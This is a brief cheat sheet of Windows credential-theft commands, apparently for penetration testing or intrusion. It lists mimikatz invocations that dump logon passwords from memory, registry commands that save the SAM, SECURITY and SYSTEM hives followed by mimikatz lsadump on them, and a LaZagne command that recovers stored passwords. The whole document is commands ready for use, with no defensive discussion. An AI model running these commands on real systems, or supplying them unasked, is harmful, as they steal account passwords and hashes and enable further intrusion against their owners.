
# Dumping logon passwords with mimikatz
```bash
./mimikatz64.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"
```
-----------------------
# Dumping LSA with mimikatz
```bash
reg save hklm\sam sam.hiv
reg save hklm\security security.hiv
reg save hklm\system system.hiv
./mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam sam.hiv security.hiv system.hiv" "exit"

./mimikatz64.exe "lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM" "exit"
./mimikatz64.exe "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
```

-----------------------

# With LaZagne
https://github.com/AlessandroZ/LaZagne
```bash
LaZagne.exe all
```
